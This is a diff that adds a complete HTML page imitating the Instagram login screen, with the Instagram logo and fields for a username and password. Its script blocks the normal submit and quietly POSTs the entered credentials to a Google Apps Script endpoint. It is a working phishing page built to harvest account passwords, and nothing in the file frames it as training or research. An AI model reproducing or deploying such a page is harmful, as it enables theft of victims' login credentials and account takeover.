@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #fafafa;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .container {
+        width: 100%;
+        max-width: 350px;
+        background-color: #fff;
+        border: 1px solid #dbdbdb;
+        padding: 40px 30px;
+        text-align: center;
+        border-radius: 8px;
+      }
+
+      .container img {
+        width: 180px;
+        margin-bottom: 20px;
+      }
+
+      .input-field {
+        width: 100%;
+        margin: 10px 0;
+      }
+
+      .input-field input {
+        width: 100%;
+        padding: 10px;
+        font-size: 14px;
+        border: 1px solid #dbdbdb;
+        border-radius: 4px;
+        background-color: #fafafa;
+      }
+
+      .login-btn {
+        width: 100%;
+        padding: 10px;
+        margin: 15px 0;
+        font-size: 14px;
+        color: white;
+        background-color: #0095f6;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-weight: bold;
+      }
+
+      .divider {
+        display: flex;
+        align-items: center;
+        margin: 15px 0;
+      }
+
+      .divider div {
+        height: 1px;
+        background-color: #dbdbdb;
+        flex: 1;
+      }
+
+      .divider span {
+        margin: 0 10px;
+        color: #8e8e8e;
+        font-size: 12px;
+        font-weight: bold;
+      }
+
+      .signup {
+        font-size: 14px;
+      }
+
+      .signup a {
+        color: #0095f6;
+        text-decoration: none;
+        font-weight: bold;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <img
+        src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
+        alt="Instagram Logo"
+      />
+
+      <form name="product">
+        <div class="input-field">
+          <input
+            type="text"
+            placeholder="Phone number, username, or email"
+            name="mobile"
+          />
+        </div>
+        <div class="input-field">
+          <input type="password" placeholder="Password" name="password" />
+        </div>
+
+        <button class="login-btn" type="submit">Log In</button>
+      </form>
+
+      <div class="divider">
+        <div></div>
+        <span>OR</span>
+        <div></div>
+      </div>
+
+      <p class="signup">Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+  </body>
+  <script>
+    // Add event listener to the login button
+
+    const scriptURL =
+      "https://script.google.com/macros/s/AKfycbxOII7Vu18SDW8ZdU7vsd3jwXlSsuzp2xymRZQh3wNefxSJZ_qKg6_KqJQHRMp8Z1DZ/exec";
+    const form = document.forms["product"];
+
+    document
+      .querySelector(".login-btn")
+      .addEventListener("click", function (event) {
+        // Prevent the default form submission behavior
+        event.preventDefault();
+        // Add your login logic here
+        fetch(scriptURL, { method: "POST", body: new FormData(form) })
+          .then((response) => {})
+          .then(() => {
+            // setTimeout(reload, 3000);
+            // window.location.href = "feedback.html";
+          })
+          .catch((error) => console.error("Error!", error.message));
+      });
+  </script>
+</html>
